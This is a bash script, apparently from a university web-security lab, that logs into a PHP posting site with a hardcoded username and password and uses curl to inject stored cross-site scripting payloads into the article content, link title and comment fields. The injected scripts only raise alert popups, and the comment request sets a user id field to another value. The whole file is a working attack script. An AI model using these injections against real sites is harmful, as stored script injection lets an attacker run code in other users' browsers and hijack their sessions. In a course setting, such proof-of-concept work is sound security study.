#!/bin/bash

if [ $# -ne 2 ]; then
	PREFIX="ugster21.student.cs.uwaterloo.ca/sdsuo"
else
	IP=$1
	PORT=$2
	PREFIX=$IP:$PORT
fi

POST_PAGE="$PREFIX/post.php"
HOME_PAGE="$PREFIX/index.php"
USERNAME="alice"
PASSWORD="passw0rd"

echo "=====[Setup]====="
echo "Using Login Page at: $POST_PAGE"
echo "Using Home Page at: $HOME_PAGE"

echo "=====[Login]====="
echo "Using username: $USERNAME"
echo "Using password: $PASSWORD"
echo "Logging in with POST request"

curl -X POST \
-c "cookie.txt" \
-F "form=login" \
-F "submit=Login" \
-F "username=$USERNAME" \
-F "password=$PASSWORD" \
$POST_PAGE

ARTICLE_TYPE=1
LINK_TYPE=2

echo "=====[Attack on Content Field of Article Post]====="
ARTICLE_POPUP="<script type='text/javascript'> alert('Popup from content field of article post');</script>"
ARTICLE_TITLE="Attack on content field of article post"

echo "Using article title: $ARTICLE_TITLE"
echo "Using article content: $ARTICLE_POPUP"

curl -X POST \
-b "cookie.txt" \
-d "form=content" \
-d "submit=Post" \
-d "type=$ARTICLE_TYPE" \
--data-urlencode "title=$ARTICLE_TITLE" \
--data-urlencode "content=$ARTICLE_POPUP" \
$POST_PAGE

echo "=====[Attack on Title Field of Link Post]====="
LINK_CONTENT="Attack on title field of link post"
LINK_POPUP="<script type='text/javascript'> alert('Popup from title field of link post');</script>"

echo "Using link title: $LINK_POPUP"
echo "Using link content: $LINK_CONTENT"

curl -X POST \
-b "cookie.txt" \
-d "form=content" \
-d "submit=Post" \
-d "type=$LINK_TYPE" \
--data-urlencode "title=$LINK_POPUP" \
--data-urlencode "content=$LINK_CONTENT" \
$POST_PAGE

echo "=====[Attack on Comment Field of Comment Post]====="
COMMENT_POPUP="Attack on comment field of comment post<script type='text/javascript'> alert('Popup from comment field of comment post');</script>"
COMMENT_PARENT=1
COMMENT_UID=7

echo "Using user id: $COMMENT_UID"
echo "Using comment parent: $COMMENT_PARENT"
echo "Using comment: $COMMENT_POPUP"

curl -X POST \
-b "cookie.txt" \
-d "form=comment" \
-d "submit=Post" \
-d "parent=$COMMENT_PARENT" \
-d "uid=$COMMENT_UID" \
--data-urlencode "comment=$COMMENT_POPUP" \
$POST_PAGE

echo "=====[Index Page]====="
echo "Showing index page with GET request"
curl -b "cookie.txt" $HOME_PAGE
